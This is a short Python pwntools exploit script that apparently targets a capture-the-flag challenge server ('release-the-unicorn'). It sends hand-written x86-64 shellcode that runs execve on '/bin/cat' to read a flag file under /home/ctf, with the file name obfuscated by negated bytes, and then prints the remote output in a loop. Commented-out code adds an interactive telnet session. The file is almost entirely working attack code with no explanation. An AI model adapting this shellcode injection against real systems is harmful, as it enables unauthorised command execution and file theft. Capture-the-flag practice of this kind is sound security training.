from pwn import *
import telnetlib


CONN=None
def transfer(test):
    global CONN
    CONN.send(test)
    time.sleep(3)
    response=CONN.recv()
    time.sleep(0.1)
    return  response



def main():
    global CONN
    #tn=telnetlib.Telnet("172.17.0.2",1024)


    CONN = remote("365e7205368350a7b6bbc35d-release-the-unicorn.challenge.master.cscg.live", 31337, ssl=True)
    #CONN = remote("172.17.0.2",1024)
    catflaghome=b"\x48\x89\xc3\x48\x31\xd2\x48\xb8\xd1\x99\x93\x9e\x98\xff\xff\xff\x48\xf7\xd8\x50\x48\xb8\x68\x6f\x6d\x65\x2f\x63\x74\x66\x50\x48\x89\xe0\x52\x48\xb9\x2f\x62\x69\x6e\x2f\x63\x61\x74\x51\x48\x89\xe7\x52\x50\x57\x48\x31\xc0\x48\x89\xe6\x30\xc0\x04\x3b\x48\x81\xfb\x41\x41\x41\x41\x76\x02\x0f\x05\xba\x78\x56\x34\x12\x00"
    time.sleep(4)
    print(CONN.recv())
    time.sleep(1)
    CONN.send(catflaghome)
    while(True):
        print(CONN.recv(timeout=10))
        time.sleep(0.1)
    """print(tn.read_eager())
    tn.write(catflaghome)
    #tn.write(secondpart)
    print(tn.read_eager())
    time.sleep(5)
    while(True):
        print(tn.read_very_eager())
        time.sleep(0.5)
        tn.write(input().encode('ascii'))
        time.sleep(0.5)
    #print(tn.read_all())
    while(True):
        tn.write(input().encode('ascii'))
        print(tn.read_very_eager())

    CONN = remote("172.17.0.2",1024)
    print(CONN.recv())
    
    print(transfer(bytecode))
    while(True):
        print(transfer(input().encode('ascii')))"""

if __name__=="__main__":
    main()